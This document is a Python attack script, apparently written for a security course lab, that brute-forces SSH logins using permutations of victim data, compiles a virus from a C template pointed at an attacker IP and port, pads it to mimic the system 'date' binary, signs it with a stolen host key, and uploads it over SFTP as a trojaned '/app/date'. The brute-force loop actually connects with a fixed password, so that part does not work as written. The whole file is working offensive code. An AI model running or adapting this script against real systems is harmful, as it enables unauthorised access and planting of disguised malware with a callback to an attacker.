#!/usr/bin/python3
import itertools
import paramiko
import os
import shutil
import sys
import subprocess
import json
import requests
import base64
import subprocess
import zlib
try:
    from kyber import Kyber512
except ImportError:
    try:
        from kyber_py.kyber import Kyber512
    except ImportError:
        print("[-] Error: Kyber512 module not found. Please ensure you have the correct library installed.")
        sys.exit(1)
    
def get_key():
    print('[*] KEM exchange with http://140.113.207.249:8080 ...')
    try:
        resp = requests.get('http://140.113.207.249:8080/kem/public-key')
        data = resp.json()
        session_id = data['session_id']
        public_key_bytes = base64.b64decode(data['public_key'])
        with open('session_id.txt', 'w') as f:
            f.write(session_id)
    except Exception as e:
        print(f"[-] Error occurred while fetching KEM key: {e}")
        sys.exit(1)

    
    Key, ciphertext = Kyber512.encaps(public_key_bytes)
    ciphertext_b64 = base64.b64encode(ciphertext).decode()

    body = {'session_id': session_id, 'ciphertext': ciphertext_b64}
    resp = requests.post('http://140.113.207.249:8080/kem/decapsulate', json=body, timeout=60)
    data = resp.json()
    key, iv = data.get('key'), data.get('iv')
    if not key or not iv:
        print('[-] Error: 無法從伺服器獲取 key 和 iv')
        sys.exit(1)
    print(f'[*] key={key} iv={iv}')
    with open('secret_key_iv.json', 'w') as f:
        json.dump({'key': key, 'iv': iv}, f)

def main():
    victim_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    username = 'csc2026'
    PP = 'csc2026'
    password = ''
    port = attacker_port
    success = False

    get_key()

    information_row = []
    # /app/victim.dat
    with open('/app/victim.dat', 'r') as f:
        for line in f:
            information_row.append(line.strip())

    all_passwords = []
    for r in range(1, len(information_row) + 1):
        for comb in itertools.permutations(information_row, r):
            all_passwords.append(''.join(comb))
    
    print('[*] Start Password Cracking SSH...')
    sshClient = paramiko.SSHClient()
    sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for pd in all_passwords:
        try:
            password = pd
            # sshClient.connect(victim_ip, username=username, password=password)
            sshClient.connect(victim_ip, username=username, password=PP)
            t = sshClient.get_transport()
            sftp = paramiko.SFTPClient.from_transport(t)
            stdin, stdout, stderr = sshClient.exec_command('ls -al')
            result = stdout.readlines()
            print(result)
            success = True
            break
        except paramiko.AuthenticationException:
            print("unlucky password: " + pd)
            continue

    # === creat the virus packet ===
    shutil.copy('/usr/bin/date', 'date')
    original_content = open('date', 'rb').read()
    if success:        
        orig_date_path = "/usr/bin/date"
        orig_size = os.path.getsize(orig_date_path)

        # 步驟 1: 壓縮原始 date 並轉成 C 標頭檔
        with open('date', 'rb') as f:
            data = f.read()
        compressed = zlib.compress(data, 9)
        with open('orig_date.gz', 'wb') as f:
            f.write(compressed)
        os.system("xxd -i orig_date.gz > orig_date_data.h")

        # 步驟 2: 讀取 C 模板，替換成正確的 IP、Port 與大小
        with open("virus_template.c", "r") as f:
            c_code = f.read()
        
        c_code = c_code.replace("<ATTACKER_IP>", attacker_ip)
        c_code = c_code.replace("<ATTACKER_PORT>", str(attacker_port))
        c_code = c_code.replace("<ORIGINAL_SIZE>", str(orig_size))

        with open("virus.c", "w") as f:
            f.write(c_code)

        # 步驟 3: 使用 gcc 編譯並極小化
        os.system("gcc -Os virus.c -o raw_virus -lz")
        os.system("strip raw_virus")

        # 步驟 4: 計算 Padding 並對齊大小
        virus_size = os.path.getsize("raw_virus")
        padding_size = orig_size - virus_size - 512

        if padding_size < 0:
            sys.exit(1)
        
        with open("raw_virus", "rb") as f_in:
            virus_data = f_in.read()

        padding_data = b'\x00' * padding_size 

        with open("padded_virus", "wb") as f_out:
            f_out.write(virus_data + padding_data)

        # 步驟 5: 使用既有的 Dilithium3 private key 產生簽章
        private_key_path = "/app/certs/host.key"
        sign_cmd = f"openssl dgst -sign {private_key_path} -provider oqsprovider -out sig.bin padded_virus"
        subprocess.run(sign_cmd, shell=True, check=True)

        # 步驟 6: 合成最終檔案 polluted_date
        with open("sig.bin", "rb") as f_sig:
            signature_data = f_sig.read()

        signature_chunk = signature_data[:512]
            
        with open("polluted_date", "wb") as f_final:
            f_final.write(virus_data + padding_data + signature_chunk)

        sftp = sshClient.open_sftp()
        
        sftp.put('polluted_date', '/app/date')
        sftp.close()
        
        sshClient.exec_command('chmod +x /app/date')
        sshClient.close()
    print("Done!")

if __name__ == "__main__":
    main()
